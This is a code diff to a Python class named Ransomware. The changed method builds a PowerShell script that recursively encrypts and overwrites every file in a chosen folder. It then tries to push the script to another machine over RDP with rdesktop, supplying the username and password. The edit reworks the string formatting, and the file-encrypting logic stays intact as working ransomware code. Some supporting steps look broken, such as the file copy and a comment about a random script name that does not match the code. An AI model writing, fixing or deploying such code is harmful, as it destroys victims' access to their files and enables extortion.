@@ -21,26 +21,27 @@ class Ransomware:
     # Encrypt all files in a folder on a different VM using RDP (rdesktop)
     def vm(self, target_vm_ip, folder_path, rdp_username, rdp_password):
         # Create the script file content for the target VM
-        script_content = r'''
-$key = "{}"
+        script_content = f'''
+$key = "{self.key.decode()}"
+$folderPath = "{folder_path}"
 
-$files = Get-ChildItem -Path "{}" -File -Recurse
+$files = Get-ChildItem -Path $folderPath -File -Recurse
 
-foreach ($file in $files) {
+foreach ($file in $files) {{
     $data = Get-Content -Path $file.FullName -Encoding Byte -ReadCount 0
     $encryptedData = [System.Security.Cryptography.ProtectedData]::Protect($data, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
     Set-Content -Path $file.FullName -Value $encryptedData -Encoding Byte
-}
-'''.format(self.key.decode(), folder_path)
+}}
+'''
 
         # Generate a random script name
         script_name = "encrypt_script.ps1"
         script_path = os.path.join(os.getcwd(), script_name)
-        
+
         # Write the script file locally
         with open(script_path, 'w') as script_file:
             script_file.write(script_content)
-        
+
         # Copy the script file to the target VM using RDP (rdesktop)
         copy_script_command = f'echo {script_path} | rdesktop -u {rdp_username} -p {rdp_password} -r disk:mydisk="/home/{rdp_username}" {target_vm_ip}'
         subprocess.Popen(copy_script_command, shell=True)
@@ -89,5 +90,3 @@ while True:
     else:
         print("Invalid choice. Please choose a valid option.")
         break
-
-
